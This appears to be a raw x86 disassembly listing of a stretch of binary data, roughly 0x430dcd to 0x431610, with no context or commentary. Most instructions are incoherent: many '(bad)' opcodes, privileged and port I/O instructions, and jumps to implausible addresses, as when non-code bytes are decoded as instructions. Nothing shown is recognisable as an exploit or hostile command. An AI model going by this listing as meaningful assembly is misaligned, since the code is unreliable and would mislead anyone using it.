  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
